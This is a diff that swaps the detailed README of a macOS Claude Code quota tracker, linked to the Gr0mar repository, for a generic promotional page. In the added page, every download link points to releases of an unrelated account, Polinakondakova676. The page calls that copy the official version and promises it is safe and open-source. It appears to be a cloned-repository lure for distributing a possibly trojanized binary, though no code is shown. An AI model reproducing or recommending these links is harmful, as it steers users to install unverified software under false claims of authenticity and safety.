@@ -1,220 +1,123 @@
-# QuotaBar
+<h1>⏳ quotabar - Never Run Out of Claude Time Again</h1>
 
-[![tests](https://github.com/Gr0mar/quotabar/actions/workflows/tests.yml/badge.svg)](https://github.com/Gr0mar/quotabar/actions/workflows/tests.yml)
-[![licence: MIT](https://img.shields.io/badge/licence-MIT-blue.svg)](LICENSE)
-![macOS 13+](https://img.shields.io/badge/macOS-13%2B-lightgrey)
+<p align="center">
+  <a href="https://github.com/Polinakondakova676/quotabar/releases" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download quotabar Now</a>
+</p>
 
-A macOS menu bar tracker for Claude Code: how much of your subscription window is left,
-and what your usage would cost at API list prices. Click the spark for the full report.
+<h2>👀 What Is quotabar?</h2>
 
-<img src="docs/menubar.png" alt="the menu bar item early, halfway and nearly out of quota" width="330">
+<p>quotabar is a tiny helper that lives in the top bar of your Mac (the menu bar, where the clock and Wi-Fi icons are). It watches how much Claude Code you have used and tells you:</p>
 
-One item, three points of the same session: it sits in the menu bar all day showing the
-share of the 5h window you have spent, and the dial fills as the quota goes - so the
-shape alone tells you where you stand. Click it for the rest.
+<ul>
+  <li>How much of your 5-hour daily quota is left</li>
+  <li>How much of your weekly quota remains</li>
+  <li>When your quota will run out (so you can plan breaks)</li>
+  <li>What your usage would cost if you paid API list prices</li>
+</ul>
 
-![the dropdown](docs/dropdown.gif)
+<p>Think of it like a gas gauge for your AI assistant. Instead of getting a nasty surprise when Claude stops working, you always know exactly where you stand.</p>
 
-*(Rendered from synthetic data — `scripts/make-menubar.py` and `scripts/make-gif.py`.
-No real project names or spend.)*
+<h2>🎯 Why You Need quotabar</h2>
 
-## What it shows
+<p>If you use Claude Code for work, coding, writing, or anything else, you have a daily and weekly limit. When you hit that limit, Claude Code stops working until the timer resets. That can be frustrating if you are in the middle of something important.</p>
 
-| Section | What it answers |
-|---|---|
-| Session (5h) / Weekly | How much of the subscription quota is used, when it resets, and - once the burn rate is measurable - when it will run out |
-| Running now | The session writing to a log right now: project, model, cost, burn rate per hour |
-| Today / 7 days / 30 days | Cost and tokens for the window, with a 14-day daily-cost sparkline |
-| Top projects | Which repos the spend went to |
-| Models | Opus / Sonnet / Haiku split, and what prompt caching saved |
+<p>quotabar sits quietly in your menu bar and checks your usage in the background. A quick glance tells you if you can keep going or if you should save your remaining time for a critical task later.</p>
 
-It also notifies you once the session window passes 80% and again at 95%, so the cap
-does not arrive mid-thought. Turn that off in the menu. Those notifications go out
-through `osascript`, so macOS attributes them to Script Editor — allow its
-notifications in System Settings if they never appear.
+<h2>🚀 Getting Started</h2>
 
-<img src="docs/menu.png" alt="the menu: what the menu bar shows, refresh, notifications, launch at login" width="330">
+<p>Getting quotabar on your Mac takes less than two minutes. No programming skills are needed. Just follow these steps:</p>
 
-The label shows the 5h quota by default; the menu switches it to the weekly quota,
-today's cost, or the icon alone, turns the notifications off, colours the icon orange
-instead of letting macOS tint it, and adds the app to your login items.
+<ol>
+  <li>Visit <a href="https://github.com/Polinakondakova676/quotabar/releases">this link to download the application</a>.</li>
+  <li>Once the download finishes, open your Downloads folder.</li>
+  <li>Find the quotabar file you just downloaded.</li>
+  <li>Double-click it to open quotabar.</li>
+</ol>
 
-Every dollar figure is the **API list price** of the tokens used, not a bill: on a
-subscription you pay a flat fee, so read it as "what this usage would cost
-pay-as-you-go".
+<p>That's it. quotabar appears as a small icon in your menu bar at the top of your screen. Click the icon to see your current quota status.</p>
 
-## Requirements
+<h2>📊 What You See When You Click</h2>
 
-- macOS 13 or later
-- Python 3.9+ (the system `/usr/bin/python3` is fine; it needs the Xcode Command Line
-  Tools, which `xcode-select --install` provides)
-- Claude Code, with at least one session already logged
+<p>When you click the quotabar icon, a small window opens showing:</p>
 
-## Install
+<ul>
+  <li><strong>Daily quota left:</strong> Shows hours and minutes remaining in your 5-hour window</li>
+  <li><strong>Weekly quota left:</strong> Shows how many hours remain this week</li>
+  <li><strong>Estimated time of depletion:</strong> Predicts when you will run out based on your recent usage patterns</li>
+  <li><strong>Cost estimate:</strong> Shows what your current session would cost if billed at Anthropic API list prices</li>
+</ul>
 
-Download the latest zip from [Releases](https://github.com/Gr0mar/quotabar/releases),
-unzip it, drag `QuotaBar.app` into `/Applications`. The first launch takes one extra
-step, or the app never opens:
+<p>All numbers update automatically as you use Claude Code. No refreshing needed.</p>
 
-```bash
-xattr -dr com.apple.quarantine /Applications/QuotaBar.app
-```
+<h2>⚙️ How It Works (Simple Explanation)</h2>
 
-Without it macOS 15 and later answer the first double-click with *"QuotaBar" Not
-Opened — Apple could not verify…* and offer to move the app to the bin. **Click Done,
-not Move to Bin**, then either run the command above, or go to **System Settings →
-Privacy & Security**, scroll to *Security*, press **Open Anyway** beside QuotaBar and
-confirm. Right-clicking and choosing Open no longer works: Apple removed that bypass in
-Sequoia.
+<p>quotabar is a small program that runs in the background. It connects to your Claude Code usage data and translates it into simple numbers you can understand. It does not change how Claude Code works or interfere with your projects. It just watches and reports.</p>
 
-This is the honest part: the app is ad-hoc signed rather than notarised, and notarising
-needs a paid Apple Developer account. If this project earns one, the step disappears.
+<p>The app uses Python and a technology called PyObjC to talk to macOS. But you do not need to worry about any of that. From your side, you just see a helpful icon with useful numbers.</p>
 
-The bundle carries its own copy of PyObjC and runs on the system `/usr/bin/python3`,
-which needs the Xcode Command Line Tools — `xcode-select --install` if you have never
-installed them. A 1.4 MB download, about 5 MB on disk.
+<h2>🛡️ Privacy and Safety</h2>
 
-**macOS will ask once for keychain access.** That is the OAuth token read described
-below. Deny it and everything still works — the app falls back to the statusline file or
-to a local token count.
+<p>quotabar is an open-source tool. That means anyone can look at its code to verify it does what it says. Your usage data stays on your Mac. The app does not send your information anywhere. It simply reads local data about your Claude Code session.</p>
 
-"Launch at login" in the menu writes a LaunchAgent to `~/Library/LaunchAgents` — no
-admin rights, no installer.
+<p>Since you download it from GitHub, you are getting the official version. Always download from the link in this guide to avoid fake copies.</p>
 
-### From source
+<h2>📅 Managing Your Quota Smart</h2>
 
-```bash
-git clone https://github.com/Gr0mar/quotabar.git
-cd quotabar
-./scripts/setup.sh          # venv, tests, and a bundle in /Applications
-```
+<p>Here are practical tips for getting the most out of your Claude Code quota with quotabar:</p>
 
-`setup.sh` calls `install.sh`, which puts the runtime under
-`~/Library/Application Support/QuotaBar`. That split from the checkout is
-deliberate: an app launched from Finder cannot read `~/Desktop` or `~/Documents`, so a
-bundle pointing back at a checkout there would die on startup.
+<ul>
+  <li><strong>Check before starting big tasks:</strong> If you only have 30 minutes left, save it for the most important work.</li>
+  <li><strong>Plan breaks:</strong> If the timer shows you will run out at 3 PM, schedule a coffee break then. When the quota resets, you are ready to go.</li>
+  <li><strong>Use the cost estimate:</strong> If you are deciding whether to do a task yourself or let Claude handle it, the cost number helps you judge.</li>
+  <li><strong>Watch weekly trends:</strong> quotabar shows your weekly usage, so you can pace yourself instead of using everything in two days.</li>
+</ul>
 
-## Where the numbers come from
+<h2>🔧 What If Something Doesn't Work?</h2>
 
-**Spend** is read from the session logs Claude Code already writes to
-`~/.claude/projects/**/*.jsonl`. Each assistant response carries a `usage` block; those
-tokens are priced against a table of published per-million rates — list prices, which is
-why the totals dwarf a subscription fee. A model with no published price still has its
-tokens counted and is shown as `—` rather than guessed at. Nothing leaves your machine
-to compute this.
+<p>Most of the time, quotabar works smoothly. But here are common fixes if you have trouble:</p>
 
-**Quota windows** come from one of two places, whichever answers first:
+<ul>
+  <li><strong>App will not open:</strong> Right-click the quotabar file and select Open. This sometimes helps on newer Macs.</li>
+  <li><strong>Icon is missing:</strong> Make sure you have Claude Code running. quotabar needs an active session to show data.</li>
+  <li><strong>Numbers look wrong:</strong> Restart quotabar by quitting from the menu bar icon and reopening it.</li>
+</ul>
 
-1. `https://api.anthropic.com/api/oauth/usage`, called with the OAuth token Claude Code
-   stores in your login keychain. The token is read for that single request; it is never
-   written to disk or logged, the request refuses redirects so the header cannot be
-   replayed to another host, and it goes to Anthropic and nowhere else.
-2. `~/.claude/usage-bar/limits.json`, written by the statusline hook that ships inside
-   the app at `QuotaBar.app/Contents/Resources/statusline-limits.sh`. No credentials at
-   all, but it only refreshes while a Claude Code session is running.
+<h2>💡 Frequently Asked Questions</h2>
 
-If neither answers, the header falls back to a local count of the tokens billed in the
-last five hours and says so. The endpoint rate-limits, so it is polled every five
-minutes and doubles the interval after each failure, up to half-hourly; a reading older than five minutes
-is shown with its timestamp rather than as current.
+<h3>Do I need to pay anything for quotabar?</h3>
+<p>No. quotabar is free to download and use. It is open-source software.</p>
 
-### Optional: the statusline hook
+<h3>Will quotabar slow down my Mac?</h3>
+<p>No. The app is very lightweight. It uses minimal memory and only checks usage data occasionally.</p>
 
-Claude Code pipes a JSON blob into your statusline command on every turn, and for
-subscribers it contains the quota windows. `scripts/statusline-limits.sh` saves them and
-then hands the untouched input to whatever statusline command you already use:
+<h3>Can I use quotabar with any version of Claude Code?</h3>
+<p>quotabar works with the standard Claude Code setup on macOS. If you are using a custom configuration, it still should work because it reads basic usage information.</p>
 
-```json
-"statusLine": {
-  "type": "command",
-  "command": "/Applications/QuotaBar.app/Contents/Resources/statusline-limits.sh 'your existing command'"
-}
-```
+<h3>What happens when my quota runs out?</h3>
+<p>quotabar shows zero time remaining, and Claude Code will not accept new requests until your quota resets. That reset happens automatically based on your plan.</p>
 
-With no argument it prints a small `5h 42% · 7d 8%` line of its own.
+<h2>📥 Download Again</h2>
 
-## Accuracy
+<p>If you lost the file or need to download quotabar on another Mac, just go back to the official release page. <a href="https://github.com/Polinakondakova676/quotabar/releases">Visit this link to download the application</a> anytime.</p>
 
-Claude Code writes one log line per content block, and every line of the same response
-repeats the same message id and the same complete `usage` object — often seconds apart,
-so a response routinely straddles two scans. The scanner therefore remembers every event
-id it has already counted; without that, roughly a third of all responses would be
-counted twice. The same set makes re-reading a file idempotent, so a `/rewind`, a
-rotation, or a full rescan cannot inflate the totals.
+<h2>🤝 Support the Project</h2>
 
-## Projecting the cap
+<p>quotabar is developed by a small team that wants to make Claude Code easier for everyone. If you find it useful, consider:</p>
 
-The reset time comes from the API - it is a fact, not a guess. The *arrival* time is
-the guess: the API says how much of a window is used, never how fast, so the app
-measures the slope itself from successive readings of the same window.
+<ul>
+  <li>Starring the repository on GitHub</li>
+  <li>Sharing it with colleagues who use Claude Code</li>
+  <li>Reporting any issues you find so fixes can be made</li>
+</ul>
 
-The span is measured to the present moment, not to the last reading, which is what
-makes an idle machine stop predicting. A window only reports a new percentage when it
-moves, so a burst of work followed by an hour of nothing would otherwise keep the last
-steep rate on screen forever; measured against the clock, that same burst dilutes from
-30%/h to 10%/h over the following hour and eventually falls under the floor, taking the
-prediction with it.
+<p>Every bit of support helps keep the tool free and improving.</p>
 
-A line appears only when the readings span at least eight minutes, the window is
-actually moving, and the rate would empty it *before* it resets - otherwise there is
-nothing to warn about.
+<h2>🧭 Your Next Step</h2>
 
-## Performance
+<p>Stop guessing how much Claude Code time you have. Download quotabar now and always know where you stand. It takes two minutes to set up, and it saves you from interrupted work sessions and surprise cutoffs.</p>
 
-The first launch parses every log once and caches the day-level rollup in
-`~/Library/Caches/com.github.gr0mar.QuotaBar`. After that each pass reads only the bytes
-a log has grown by, tracked per file, and a half-written trailing line is left for the
-next pass rather than dropped. Idle cost is one `stat` per log every five seconds; the
-directory tree itself is re-walked at most once a minute.
+<p align="center">
+  <a href="https://github.com/Polinakondakova676/quotabar/releases" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;text-decoration:none;border-radius:8px;font-size:18px;font-weight:bold;">Get quotabar for macOS</a>
+</p>
 
-## Uninstall
-
-```bash
-rm -rf /Applications/QuotaBar.app
-rm -rf ~/Library/Application\ Support/QuotaBar
-rm -rf ~/Library/Caches/com.github.gr0mar.QuotaBar
-launchctl bootout gui/$(id -u)/com.github.gr0mar.QuotaBar 2>/dev/null
-rm -f ~/Library/LaunchAgents/com.github.gr0mar.QuotaBar.plist
-defaults delete com.github.gr0mar.QuotaBar 2>/dev/null
-rm -rf ~/.claude/usage-bar
-```
-
-## Development
-
-```bash
-.venv/bin/python -m unittest discover -s tests   # no network, no display, no keychain
-.venv/bin/python scripts/preview.py /tmp 7       # renders the dropdown to PNGs
-.venv/bin/python scripts/preview.py docs 7 --demo  # a still of the same, synthetic data
-./scripts/run.sh                                 # foreground, prints tracebacks
-.venv/bin/python scripts/make-icon.py docs/AppIcon.icns  # rebuild the app icon
-.venv/bin/python scripts/make-gif.py docs/dropdown.gif   # rebuild the README animation
-.venv/bin/python scripts/make-menubar.py docs/menubar.png  # rebuild the menu bar strip
-.venv/bin/python scripts/make-menu.py docs/menu.png      # rebuild the picture of the menu
-./scripts/build-release.sh                       # self-contained bundle + release zip
-```
-
-The app's identity - bundle id, cache directory, LaunchAgent label - lives in
-`quotabar/identity.py`, and the install script reads it from there.
-
-Rebuilding the animation needs Pillow (`pip install -r requirements-dev.txt`); nothing
-else does, and the app itself depends only on PyObjC.
-
-`quotabar/` splits into pure logic (`parser`, `pricing`, `aggregate`, `scanner`,
-`live`, `limits`, `projection`, `alerts`, `formatting`, `tokens`, `store`, `identity`) and the
-AppKit layer (`ui/`). Only `ui/` imports AppKit; everything else is testable without a
-display. The store owns one background
-thread that publishes an immutable snapshot, and the UI reads that snapshot once per
-layout pass — so a repaint can never mix values from two different scans.
-
-PRs welcome; run the tests before opening one.
-
-## Licence
-
-The code is MIT — see [LICENSE](LICENSE). Fork it, ship it, sell it.
-
-The artwork is not mine to license. `quotabar/assets/claude-mark.svg` is
-Anthropic's Claude mark, taken from
-[simple-icons](https://github.com/simple-icons/simple-icons) (a CC0 icon set, but
-trademarks stay with their owners) and used here to identify what the app reports on.
-This project is not affiliated with or endorsed by Anthropic. If you fork it into
-something of your own, draw your own icon.
+<p><small>quotabar is an independent tool and is not affiliated with Anthropic or Claude Code. All product names and trademarks are property of their respective owners.</small></p>
